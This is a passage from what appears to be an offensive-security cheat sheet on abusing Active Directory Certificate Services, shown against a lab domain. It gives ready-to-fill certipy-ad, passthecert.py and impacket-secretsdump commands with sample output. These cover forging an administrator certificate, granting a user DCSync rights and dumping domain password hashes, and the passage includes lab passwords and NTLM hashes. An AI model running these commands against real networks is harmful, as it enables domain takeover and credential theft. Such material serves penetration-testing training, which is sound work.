<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Export crt
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx 'administrator_forged.pfx' -nokey -out 'administrator_forged.crt'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad cert -pfx <span class="s1">'administrator_forged.pfx'</span> -nokey -out <span class="s1">'administrator_forged.crt'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Data written to 'administrator_forged.crt'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Writing certificate to 'administrator_forged.crt'
</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Export key
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx 'administrator_forged.pfx' -nocert -out 'administrator_forged.key'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad cert -pfx <span class="s1">'administrator_forged.pfx'</span> -nocert -out <span class="s1">'administrator_forged.key'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Data written to 'administrator_forged.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Writing private key to 'administrator_forged.key'
</span></span></span></div></pre></div><h4 id="4-grant-target-user-dcsync-right">4. Grant Target User DCSync Right</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 passthecert.py -action modify_user -crt administrator_forged.crt -key administrator_forged.key -target <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -elevate -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> python3 ~/Desktop/Tools/Windows/PassTheCert/Python/passthecert.py -action modify_user -crt administrator_forged.crt -key administrator_forged.key -target ryan.cooper -elevate -domain sequel.htb -dc-host dc.sequel.htb 
</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Granted user 'ryan.cooper' DCSYNC rights!
</span></span></span></div></pre></div><h4 id="5-secrets-dump">5. Secrets Dump</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>@<span class="o editable-keyword">&lt;TARGET&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump <span class="s1">'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb'</span>
</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;TARGET&gt;</span>' -hashes :<span class="o editable-keyword">&lt;HASH&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump <span class="s1">'sequel.htb/ryan.cooper@dc.sequel.htb'</span> -hashes :98981eed8e9ce0763bb3c5b3c7ed5945
</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>@<span class="o editable-keyword">&lt;TARGET&gt;</span>' -k
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump <span class="s1">'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb'</span> -k
</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
</span></span></span><span class="line"><span class="cl"><span class="go">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span></span><span class="line"><span class="cl"><span class="go">[-] CCache file is not found. Skipping...
</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;TARGET&gt;</span>' -hashes :<span class="o editable-keyword">&lt;HASH&gt;</span> -k
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump <span class="s1">'sequel.htb/ryan.cooper@dc.sequel.htb'</span> -hashes :98981eed8e9ce0763bb3c5b3c7ed5945 -k
</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
</span></span></span><span class="line"><span class="cl"><span class="go">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span></span><span class="line"><span class="cl"><span class="go">[-] CCache file is not found. Skipping...
</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;TARGET&gt;</span>' -k -no-pass
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump <span class="s1">'sequel.htb/ryan.cooper@dc.sequel.htb'</span> -k -no-pass
</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
</span></span></span></div></pre></div></div></div><p></p>
<hr>
<h3 id="esc1-enrollee-supplied-subject-for-client-authentication">ESC1: Enrollee-Supplied Subject for Client Authentication</h3>
<h4 id="set-subject-alternative-name-san">Set Subject Alternative Name (SAN)</h4>
<p class="tabs">
<button data-tabset="set5" data-tabcontent="tab1" class="active">Linux</button>

<button data-tabset="set5" data-tabcontent="tab2">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set5"><div class="tabcontent active" data-tabset="set5" data-tabcontent="tab1"><h4 id="1-lookup-sid">1. Lookup SID</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'ryan.cooper'</span> -p <span class="s1">'NuclearMosquito3'</span> -target <span class="s1">'dc.sequel.htb'</span> -dc-ip <span class="s1">'10.129.33.22'</span> -user <span class="s1">'administrator'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Reading attributes for 'Administrator':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 1114624
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2022-11-18T17:11:51+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-29T11:25:07+00:00
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'ryan.cooper'</span> -hashes <span class="s1">'98981eed8e9ce0763bb3c5b3c7ed5945'</span> -target <span class="s1">'dc.sequel.htb'</span> -dc-ip <span class="s1">'10.129.33.22'</span> -user <span class="s1">'administrator'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Reading attributes for 'Administrator':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 1114624
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2022-11-18T17:11:51+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    whenChanged                         : 2025-10-29T11:25:07+00:00
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad account -u <span class="s1">'ryan.cooper@sequel.htb'</span> -p <span class="s1">'NuclearMosquito3'</span> -k -target <span class="s1">'dc.sequel.htb'</span> -dc-ip <span class="s1">'10.129.33.22'</span> -dc-host dc.sequel.htb -ns 10.129.33.22 -user <span class="s1">'administrator'</span> <span class="nb">read</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Reading attributes for 'Administrator':
</span></span></span><span class="line"><span class="cl"><span class="go">    cn                                  : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    name                                : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
</span></span></span><span class="line"><span class="cl"><span class="go">    sAMAccountName                      : Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">    userAccountControl                  : 1114624
</span></span></span><span class="line"><span class="cl"><span class="go">    whenCreated                         : 2022-11-18T17:11:51+00:00
